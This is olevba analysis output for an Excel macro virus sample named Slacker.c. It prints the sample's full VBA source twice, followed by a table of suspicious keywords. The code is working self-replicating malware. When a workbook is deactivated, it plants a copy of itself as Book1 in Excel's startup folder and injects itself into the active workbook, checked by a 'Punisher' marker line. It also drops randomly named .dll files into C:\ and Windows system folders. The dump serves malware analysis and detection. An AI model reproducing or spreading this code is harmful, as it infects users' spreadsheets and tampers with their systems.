olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Slacker.c-50a66e2584e9f3e555e2674fe042e76a4ff2c438
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Slacker.c-50a66e2584e9f3e555e2674fe042e76a4ff2c438 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




'<!--Punisher-->

Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--Punisher-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub

Private Sub Biking()
On Error Resume Next
Dim nomor
nomor = Int((6 * Rnd) + 1)
Select Case nomor
Case 1
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 2
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 3
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\System\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 4
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\System32\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 5
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\Sysbckup" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 6
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
End Select
End Sub

Private Function NamingCharacter(CharacterCount As Integer)
Dim IntegerVariable1 As Integer
Dim CharacterCode As Integer
Dim NamingCharacterTemp As String
Dim FractionNumber1 As Double
Dim FractionNumber2 As Double
Dim RandomNumber As Double
Dim IntegerVariable As Integer
NamingCharacterTemp = ""
IntegerVariable1 = CharacterCount
For IntegerVariable = 1 To IntegerVariable1
FractionNumber1 = 10 / 62
FractionNumber2 = 36 / 62
Randomize
RandomNumber = Rnd()
Randomize
If RandomNumber < FractionNumber1 Then
CharacterCode = Int((57 - 48 + 1) * Rnd + 48)
ElseIf RandomNumber < FractionNumber2 Then
CharacterCode = Int((90 - 65 + 1) * Rnd + 65)
Else
CharacterCode = Int((122 - 97 + 1) * Rnd + 97)
End If
NamingCharacterTemp = NamingCharacterTemp + Chr(CharacterCode)
Next
NamingCharacter = NamingCharacterTemp
End Function




'<!--Punisher-->

Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--Punisher-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub

Private Sub Biking()
On Error Resume Next
Dim nomor
nomor = Int((6 * Rnd) + 1)
Select Case nomor
Case 1
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 2
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 3
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\System\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 4
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\System32\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 5
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\Sysbckup" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
Case 6
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.SaveAs FileName:="C:\Windows\" & NamingCharacter(9) & ".dll", FileFormat:=xlNormal, AddToMru:=False
        xlApp.Quit
End Select
End Sub

Private Function NamingCharacter(CharacterCount As Integer)
Dim IntegerVariable1 As Integer
Dim CharacterCode As Integer
Dim NamingCharacterTemp As String
Dim FractionNumber1 As Double
Dim FractionNumber2 As Double
Dim RandomNumber As Double
Dim IntegerVariable As Integer
NamingCharacterTemp = ""
IntegerVariable1 = CharacterCount
For IntegerVariable = 1 To IntegerVariable1
FractionNumber1 = 10 / 62
FractionNumber2 = 36 / 62
Randomize
RandomNumber = Rnd()
Randomize
If RandomNumber < FractionNumber1 Then
CharacterCode = Int((57 - 48 + 1) * Rnd + 48)
ElseIf RandomNumber < FractionNumber2 Then
CharacterCode = Int((90 - 65 + 1) * Rnd + 65)
Else
CharacterCode = Int((122 - 97 + 1) * Rnd + 97)
End If
NamingCharacterTemp = NamingCharacterTemp + Chr(CharacterCode)
Next
NamingCharacter = NamingCharacterTemp
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Slacker.c-50a66e2584e9f3e555e2674fe042e76a4ff2c438 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Slacker.c-50a66e2584e9f3e555e2674fe042e76a4ff2c438 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Slacker.c-50a66e2584e9f3e555e2674fe042e76a4ff2c438 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

